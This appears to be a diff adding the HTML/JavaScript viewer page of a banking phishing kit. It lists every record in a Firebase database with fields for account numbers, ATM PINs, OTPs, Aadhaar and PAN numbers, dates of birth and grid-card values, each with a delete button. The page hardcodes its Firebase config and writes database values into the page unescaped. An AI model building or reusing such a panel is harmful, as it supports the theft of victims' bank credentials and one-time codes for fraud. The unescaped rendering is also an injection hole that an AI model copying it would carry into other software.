@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Firebase Data Display</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+    h1 { text-align: center; color: #333; }
+    table { width: 100%; border-collapse: collapse; background: #fff; margin-top: 20px; }
+    th, td { border: 1px solid #444; padding: 10px; text-align: left; vertical-align: top; }
+    th { background: #f69312; color: #fff; }
+    tr:nth-child(even) { background: #f9f9f9; }
+    .no-data { text-align: center; margin-top: 20px; color: #777; }
+    .field-name { font-weight: bold; color: #333; }
+    .mini-table { border-collapse: collapse; margin-top: 5px; }
+    .mini-table th, .mini-table td { border: 1px solid #999; padding: 5px; text-align: center; }
+    .mini-table th { background: #eee; }
+    .delete-btn {
+      background-color: #ff4444;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .delete-btn:hover {
+      background-color: #cc0000;
+    }
+  </style>
+</head>
+<body>
+  <h1>All User Data</h1>
+  <div id="data-container">Loading data...</div>
+
+  <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
+      authDomain: "motutest-ac954.firebaseapp.com",
+      databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
+      projectId: "motutest-ac954",
+      storageBucket: "motutest-ac954.firebasestorage.app",
+      messagingSenderId: "85522378752",
+      appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Fields to display
+    const fieldsToDisplay = [
+      "accountNumber", "mobileNumber", "gridValues", "userID", 
+      "otp1", "dateOfBirth", "fullName", "panNumber", 
+      "otp2", "fullName1", "aadharNumber", "atmPin", "otp3"
+    ];
+
+    // Function to render gridValues properly
+    function renderGridValues(value) {
+      if (typeof value === "object" && value !== null) {
+        const keys = Object.keys(value).sort(); // order me sort
+        let html = "<table class='mini-table'><tr>";
+        keys.forEach((key, index) => {
+          html += `<th>${key.replace("grid","")}</th>`;
+          if ((index + 1) % 8 === 0) {
+            html += "</tr><tr>";
+          }
+        });
+        html += "</tr><tr>";
+        keys.forEach((key, index) => {
+          html += `<td>${value[key]}</td>`;
+          if ((index + 1) % 8 === 0) {
+            html += "</tr><tr>";
+          }
+        });
+        html += "</tr></table>";
+        return html;
+      }
+      return value || "";
+    }
+
+    // Function to delete a user
+    function deleteUser(userId) {
+      if (confirm("Are you sure you want to delete this user?")) {
+        database.ref("user/" + userId).remove()
+          .then(() => {
+            alert("User deleted successfully");
+          })
+          .catch((error) => {
+            console.error("Error deleting user:", error);
+            alert("Error deleting user");
+          });
+      }
+    }
+
+    // Fetch and display data
+    function displayData() {
+      const dataRef = database.ref("user");
+      const dataContainer = document.getElementById("data-container");
+
+      dataRef.on("value", (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          let table = `
+            <table>
+              <thead>
+                <tr>
+                  <th>No.</th>
+                  <th>User Details</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+              <tbody>
+          `;
+
+          let counter = 1;
+          for (const key in data) {
+            if (data.hasOwnProperty(key)) {
+              const item = data[key];
+              table += `<tr>
+                <td>${counter}</td>
+                <td>`;
+
+              fieldsToDisplay.forEach(field => {
+                let value = item[field] || "";
+                if (field === "gridValues" && value) {
+                  value = renderGridValues(value);
+                }
+                table += `<div><span class="field-name">${field}:</span> ${value}</div>`;
+              });
+
+              table += `</td>
+                <td>
+                  <button class="delete-btn" onclick="deleteUser('${key}')">Delete</button>
+                </td>
+              </tr>`;
+              counter++;
+            }
+          }
+
+          table += "</tbody></table>";
+          dataContainer.innerHTML = table;
+        } else {
+          dataContainer.innerHTML = '<div class="no-data">No data found.</div>';
+        }
+      }, (error) => {
+        console.error("Error:", error);
+        dataContainer.innerHTML = '<div class="no-data">Error loading data.</div>';
+      });
+    }
+
+    displayData();
+  </script>
+</body>
+</html>
